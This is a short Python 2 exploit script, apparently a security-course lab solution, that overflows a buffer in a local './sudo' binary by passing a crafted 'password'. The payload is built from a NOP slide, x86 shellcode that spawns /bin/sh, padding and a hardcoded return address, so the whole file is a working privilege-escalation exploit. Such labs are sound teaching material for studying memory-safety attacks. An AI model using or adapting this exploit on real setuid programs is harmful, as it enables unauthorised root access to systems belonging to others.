import os, sys, subprocess, struct


PATH_TO_SUDO = './sudo'


def run_shell():
    address_of_beginning_of_buffer = 0xbfffdf99
    # address_of_ra = 0xbfffdfdc 
    buffer_offset_from_ret = 0x43
    remote_code = "\xeb\x10\x5b\x31\xc0\x88\x43\x07\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x40"

    nop_slide = "\x90" * 10
    len_nop_padding = buffer_offset_from_ret - len(remote_code) - len(nop_slide)
    nop_padding = "\x90" * len_nop_padding
    fake_password = nop_slide + remote_code + nop_padding + conv(address_of_beginning_of_buffer) 
    cmd = "stam"

    subprocess.call([PATH_TO_SUDO, fake_password, cmd])
    
    # raise NotImplementedError()

#endianess convertion
def conv(num):
    return struct.pack("<I",num)


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    run_shell()


if __name__ == '__main__':
    main(sys.argv)
